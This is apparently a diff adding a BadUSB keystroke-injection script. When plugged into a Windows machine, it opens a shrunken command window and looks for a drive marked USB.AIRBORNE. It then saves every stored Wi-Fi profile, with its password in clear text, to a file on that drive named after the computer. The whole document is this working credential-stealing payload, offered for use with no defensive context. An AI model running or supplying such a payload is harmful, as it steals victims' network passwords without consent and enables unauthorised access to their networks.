@@ -1,0 +1,19 @@
+[BadUSB]
+[BypassChineseIME]
+[Win+R]
+[Delay]
+[Delay]
+cmd /k mode con: cols=15 lines=1
+[Enter]
+[Delay]
+[Delay]
+[Delay]
+set "U="
+[Enter]
+for %D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %D:\USB.AIRBORNE set "U=%D:"
+[Enter]
+if defined U for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> "%U%\%COMPUTERNAME%_%RANDOM%.txt"
+[Enter]
+exit
+[Enter]
+[BadUSB]
